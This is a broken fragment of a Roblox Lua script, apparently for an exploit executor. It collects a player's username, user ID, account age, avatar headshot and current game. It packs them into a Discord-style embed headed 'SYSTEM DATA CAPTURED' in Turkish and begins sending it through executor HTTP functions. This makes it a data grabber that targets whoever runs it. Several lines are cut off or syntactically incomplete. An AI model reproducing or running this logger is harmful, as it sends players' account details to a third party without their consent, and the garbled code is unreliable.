")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
TUVWXYZ0123456789"
 
    local str = ""
    for i = 1, l
        local r = math.random(1, #chars)
        str = str .. string.sub(chars, r, r)
    end
    return str
end

--// DATA ENGINE
local function BuildPayload()
    local 
    -- Oyuncunun Kafa Resmini (Thumbnail) Almak
    local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=150&height=150&format=png"
    
    local gameName = "Bilinmiyor"
    pcall(function()
        gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    
    return {
        ["username"] = "Database Terminal",
        ["avatar_url"] = "https://i.imgur.com/8n1699R.png",
        ["embeds"] = {{
            ["title"] = "?? SİSTEM VERİSİ YAKALANDI",
            ["color"] = 0x2b2d31, -- Discord koyu tema rengi
            ["thumbnail"] = { -- Oyuncunun kafa resmi burada ekleniyor
                ["url"] = headshotUrl
            },
            ["fields"] = {
                {["name"] = "?? Kullanıcı Adı", ["value"] = "```" .. lp.Name .. "```", ["inline"] = true},
                {["name"] = "?? Kullanıcı ID", ["value"] = "```" .. lp.UserId .. "```", ["inline"] = true},
                {["name"] = "?? Hesap Yaşı", ["value"] = lp.AccountAge .. " Gün", ["inline"] = true},
                {["name"] = "?? 
            ["footer"] = {["text"] = "Status: Encrypted Data Transferred"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
end

--// SENDER
local function Send()
    local data = HttpService:JSONEncode(BuildPayload())
    pcall(function()
        local request = (syn and syn.request) or (http and http.request) or http_request 
